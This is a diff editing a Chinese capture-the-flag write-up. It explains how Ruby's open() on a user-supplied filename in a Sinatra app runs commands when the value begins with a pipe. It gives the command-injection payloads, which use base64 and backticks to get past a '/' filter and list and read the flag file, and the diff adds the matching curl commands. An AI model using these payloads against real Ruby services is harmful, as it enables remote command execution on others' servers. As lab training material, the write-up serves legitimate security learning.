@@ -68,9 +68,9 @@ end
 
 题目给了一份 app.rb，是一个用 Sinatra 写的 Ruby 小程序：可以做首页、上传 PNG、以及把 PNG 转换成 base64 显示。
 
-根据dsh，关键在 /convert 这个 POST 路由：它先做三道检查——文件名里不能有 ..、不能有 /、必须以 .png 结尾——通过之后就用 open(file, 'r') 去读文件，再把读到的内容 base64 编码返回。
+根据dsh的提示，关键在 /convert 这个 POST 路由：它先做三道检查——文件名里不能有 ..、不能有 /、必须以 .png 结尾——通过之后就用 open(file, 'r') 去读文件，再把读到的内容 base64 编码返回。
 
-问题出在 Ruby 的 open 上：如果传给 open 的字符串以管道符 | 开头，它不会去读文件，而是把后面的内容当成命令去执行。所以只要让 file 的值以 | 开头，再让整串以 .png 收尾骗过正则，就能在服务器上执行任意命令。又因为 / 被过滤，命令里只要带路径，就得先 base64 编码藏起来，配合反引号在命令里解码，这就是所谓的"管道符与反引号配合"。
+问题出在 Ruby 的 open 上：如果传给 open 的字符串以管道符 | 开头，它不会去读文件，而是把后面的内容当成命令去执行。所以只要让 file 的值以 | 开头，再让整串以 .png 收尾骗过正则，就能在服务器上执行任意命令。又因为 / 被过滤，命令里只要带路径，就得先 base64 编码藏起来，配合反引号在命令里解码，这就是常说的"管道符与反引号配合"。
 
 ### 详细步骤
 
@@ -90,6 +90,10 @@ end
     POST /convert
     file=|ls||echo${IFS}>2.png
 
+    实际敲的命令（单引号不能省，否则 ${IFS} 会被本地 shell 展开）：
+
+    curl -X POST --data-urlencode 'file=|ls||echo${IFS}>2.png' http://靶场地址/convert
+
     返回里能看到 app.rb、view 目录，以及两个上传过的 png，没有 flag.php
 
 5. 再看根目录找 flag 文件（命令里的 / 要藏起来，所以用 base64）
@@ -99,6 +103,10 @@ end
     POST /convert
     file=|`echo "bHMgLw==" | base64 -d`||echo${IFS}>2.png
 
+    实际敲的命令：
+
+    curl -X POST --data-urlencode 'file=|`echo "bHMgLw==" | base64 -d`||echo${IFS}>2.png' http://靶场地址/convert
+
     返回里看到根目录下有一个 flag_30490
 
 6. 直接把它读出来
@@ -106,13 +114,21 @@ end
     POST /convert
     file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png
 
-7. 响应是一段 JS，里面的 data:image/png;base64, 后面那串就是文件内容被 base64 之后的结果。
+    实际敲的命令：
 
-8. 解码获得flag
+    curl -X POST --data-urlencode 'file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png' http://靶场地址/convert
+
+7. 响应是一段 JS，里面的 data:image/png;base64, 后面那串就是文件内容被 base64 之后的结果
+
+8. 把响应里那段 base64 解码，解出来的明文就是 flag，获得flag
 
 ### Payload
 
 file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png
+
+实际发送：
+
+curl -X POST --data-urlencode 'file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png' http://靶场地址/convert
 
 ### flag
 
@@ -120,4 +136,4 @@ ctfhub{495402a295e64e154691dcdf}
 
 ### 总结&反思
 
-本次我首次见到.rb文件，也让我对网页侵入的流程有了最初的认识。
+本次我首次见到 .rb 文件，也对 Web 渗透的流程有了初步认识。
